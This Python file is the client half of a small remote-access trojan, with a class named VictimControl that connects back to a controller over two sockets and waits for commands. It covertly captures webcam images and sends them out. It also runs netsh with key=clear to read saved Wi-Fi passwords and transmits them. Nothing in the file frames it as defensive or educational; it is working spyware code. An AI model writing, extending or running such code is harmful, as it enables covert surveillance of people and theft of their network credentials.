import socket
import cv2
import os
import pickle

# Todo: Fix script structure
# Todo: Seperate script using classes etc..


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


HOST = socket.gethostname()
PORT = 55555
DATA_PORT = 44444
buffer = 1024
attempt_count = 1


class VictimControl(object):
    def __init__(self, main, data):
        self.main_conn = main
        self.data_conn = data

    def receive_command(self):
        while True:
            cmd = main_socket.recv(buffer).decode('utf-8')
            print(cmd)

            if cmd == 'take picture':
                camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                return_value, image = camera.read()
                camera.release()
                cv2.destroyAllWindows()
                data = pickle.dumps(image)
                size = len(data)
                data_socket.send(str(size).encode('utf-8'))
                msg = data_socket.recv(1024).decode('utf-8')

                if msg == 'ok':
                    data_socket.send(data)

            elif cmd == 'get wifi':
                self.get_ssid()

    def get_ssid(self):
        run_cmd = os.popen('netsh wlan show interfaces')

        for line in run_cmd:
            if 'SSID' in line:
                text = line
                ssid = text.replace(' ', '')
                ssid = ssid.replace('SSID:', '')
                self.get_pswrd(ssid)

    def get_pswrd(self, ssid):
        ssid = ssid.rstrip()
        credentials = '\n'
        run_cmd = os.popen('netsh wlan show profiles name={} key=clear'.format(ssid))

        for line in run_cmd:
            if 'SSID name' in line:
                text = line.split()
                credentials += 'SSID: ' + text[3] + '\n\n'

            if 'Key Content' in line:
                text = line.split()
                credentials += 'Password: ' + text[3]

        self.data_conn.send(credentials.encode('utf-8'))


if __name__ == '__main__':
    main_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    data_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            main_socket.connect((HOST, PORT))
            data_socket.connect((HOST, DATA_PORT))
            break
        except ConnectionRefusedError:
            clear_screen()
            print(f' Failed to connect {attempt_count} times!')
            attempt_count += 1

    victim = VictimControl(main_socket, data_socket)
    victim.receive_command()